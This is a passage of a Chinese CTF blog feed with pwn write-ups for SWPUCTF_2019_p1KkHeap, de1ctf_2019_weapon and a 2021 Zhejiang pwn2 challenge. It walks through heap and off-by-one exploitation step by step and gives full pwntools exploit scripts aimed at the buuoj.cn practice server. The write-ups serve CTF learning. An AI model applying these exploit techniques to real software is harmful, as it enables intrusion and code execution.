class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br></pre></td></tr></table></figure><p>来看看结果吧</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/2.png" alt="2"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line"><span class="keyword">if</span> x:</span><br><span class="line">p=process(file_name)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29949</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">p.sendafter(<span class="string">b&#x27;content: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./SWPUCTF_2019_p1KkHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;=&#x27;)</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录—&lt;a href=&quot;https://buuoj.cn/challenges#SWPUCTF_2019_p1KkHeap&quot;&gt;SWPUCTF_2019_p1KkHeap&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>de1ctf_2019_weapon writeup</title>
    <link href="http://example.com/2021/11/07/de1ctf_2019_weapon/"/>
    <id>http://example.com/2021/11/07/de1ctf_2019_weapon/</id>
    <published>2021-11-07T14:00:00.000Z</published>
    <updated>2021-11-07T02:15:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#de1ctf_2019_weapon">de1ctf_2019_weapon</a></p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec一波，保护全开，ida分析，发现时经典的堆菜单题目。有add，delete和edit操作，没有show函数，并且保护全开无法劫持got表。那么这题大概率是要用IO来泄露libc了。</p><p>add函数把堆块申请范围限制在了0x60以内，也就是说我们只能申请fastbin大小的堆块。edit函数就是中规中矩的按照之前的size修改堆块的内容。delete函数在堆块被free之后没有把指针置空存在UAF的漏洞。那么我们的思路大概就是先通过uaf进行堆块重叠然后修改size，free之后得到一个unsorted bin，然后再修改回fastbin将它申请到stdout附近通过IO泄露libc地址，最后再来一次fastbin attack劫持malloc hook放上onegadget 去getshell，这题需要用realloc 调整栈来适应onegadget，我们后面再说。</p><h2 id="泄露libc的地址"><a href="#泄露libc的地址" class="headerlink" title="泄露libc的地址"></a>泄露libc的地址</h2><p>因为地址都是未知的，所以一开始要通过释放两个相同大小的fastbin来让其中一个fastbin中留下另一个fastbin的地址，再通过修改最后一字节让fastbin的fd来让第二个chunk申请到可以造成堆重叠的地方便于我们修改size。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))<span class="comment">#在合适的地方伪造chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#提前free让fastbin中存在这个chunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/07/de1ctf_2019_weapon/1.png" alt="1"></p><p>可以看到第一个chunk的fd已经有了第四个chunk的地址，并且在第一个堆块中存在一个伪造的0x61作为fake chunk的size，所以接下来我们只要edit 0 \x50就能够产生fastbin attack了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))<span class="comment">#修改第二个堆块的size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#释放unsorted bin 让bin的fd中留下libc的地址</span></span><br><span class="line">edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这一波操作就能成功泄露libc了，但是由于内存页是后三位对齐，我们填充是以字节为单位的，所以这里需要爆破一半个字节。</p><h2 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h2><p>这里没什么好说的，就是通过uaf的方法把堆块申请到malloc_hook-0x23的地方，写mallochook为reallochook，再把realloc hook写上对应的one gadget，这里需要注意的是realloc不一定直接就行了，需要适当跳过一些push或这pop之类的指令来调整栈中的0到合适的位置，这里我用了第2个onegadget，用realloc + 4的地方来调整栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最后附上爆破的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line"><span class="keyword">if</span> x:</span><br><span class="line">p=process(file_name)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29410</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./de1ctf_2019_weapon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2021/11/07/de1ctf_2019_weapon/2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录—&lt;a href=&quot;https://buuoj.cn/challenges#de1ctf_2019_weapon&quot;&gt;de1ctf_2019_weapon&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>2021浙江省赛pwn2复盘</title>
    <link href="http://example.com/2021/11/06/zjctf2021%20pwn2/"/>
    <id>http://example.com/2021/11/06/zjctf2021%20pwn2/</id>
    <published>2021-11-06T14:00:00.000Z</published>
    <updated>2021-11-12T02:56:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>首先checksec发现保护全开了，ida打开，主函数是一个while 1 循环且没有return，如果要栈溢出得在其它函数。首先ida分析有部分不到位，有一个很明显的值赋值指针，然后后面还有对指针之后的元素读取一个int型变量，很明显栈布局是这样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char buf[]</span><br><span class="line"></span><br><span class="line">char *ptr</span><br><span class="line">int size</span><br></pre></td></tr></table></figure><p>然后我们去混淆一下，去除那个指针刚好是31个int_64，把它改变一下就是char buf[248]，如下更方便分析(isnan函数是因为去除了alarm方便调试)</p><p><img src="/2021/11/06/zjctf2021%20pwn2/1.png" alt="1"></p><p>可以很明显的看到中间有两层检测，但是一旦不满足最外层那个检测那么就会循环输出<code>too easy</code>，因此我们看看这个判断是什么，这个判断的意思就是我们的指针只有在&gt;=缓冲区地址或者&lt;=rbp-0x220才允许执行下面的流程。因为栈是向低地址增长，所以第一个判断就是ptr要落在buf或者buf下面(栈底方向)。如果我们有机会修改ptr，那确实可以通过ptr任意写，而我们之前分析的是不能通过main函数溢出，所以往后面写没多大用处，那么我们看看第二个条件。意思大概就是如果不在buf下面，那么在上面也要离buf有一定距离，这个距离是rbp-0x220，然后buf最顶端距离rbp是0x120，所以指针不能落在(buf-0x100,buf)范围内因为判过有等号，所以判不过自然是开区间。</p><p>size只能0x100以内，观察类型发现判断的时候类型为unsigned，不能负溢。那么进入myputs，myread和mywrite查看。</p><p>myputs：单个字符输出，遇到\0停止输出。</p><p>mywrite：固定逐字节输出那么长的字节序列。</p><p>myread：也是逐字节读入那么长的序列，并且while  read(1)表示必须要读那么多的字节，但是注意他循环是从0，然后对size判断的时候加了等号，这就意味着能够多读入一个字节，存在off by one。</p><p>buf距离ptr刚好0x100字节，如果溢出一个字节那么可以溢出一个较大字节，使得等会通过这个指针输出的时候能够输出后面的栈内容。</p><h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>我们通过之前分析的内构造以下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span><span class="comment">#libc中寻找的</span></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/2.png" alt="2"></p><p>可以看到后面输出了很多东西，但是因为栈不存在内存页对齐的说法，所以最后一个字节改大之后能输出多少东西全凭运气。我们可以在输入之后用gdb attach去查看此时栈的情况看看能泄露什么东西。由于没有去符号表，因此为了方便定位代码我们直接在后面加上b mywrite。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/3.png" alt="3"></p><p>圈出来的是指针末尾被改了的情况，然后三个箭头是可以泄露的东西，分别能泄露栈，libc和程序的加载基址。但是如果buf本身所在位置的最低字节就是e0,f0之类的那可能泄露不了这么多东西，所以这一点也是看脸的。那么我们如何接收泄露的数据呢？</p><p>首先我们第一个泄露的地址应该是ptr，但是ptr被我们改过，我们并具体泄露出这个buf在哪个位置。所以这个我们不考虑，我们接受后面的栈地址，计算一下泄露地址和buf的偏移得到buf地址。后面的没啥好说的，就是开了pie之后程序加载基址不知道具体会在哪，不过据我观察它大部分高字节是55，有时候是56，所以我们就以55判断吧。但是为了调试方便我们选择先关闭aslr调试，具体细节就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>关闭之后开了aslr的程序固定加载在0x555555554000上面，所以我们选择以四个字节的55来判断是否有没有泄露到程序加载基址，等到打远程的时候调回来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span><span class="comment">#buf_addr-8</span></span><br><span class="line"><span class="comment">#因为一开始指向劫持这个忽略了条件不允许，这里到后来也没改，问题不大，之后在引用这个值的时候+8就完事了。</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span><span class="comment">#libc_base</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>*<span class="number">4</span>)[-<span 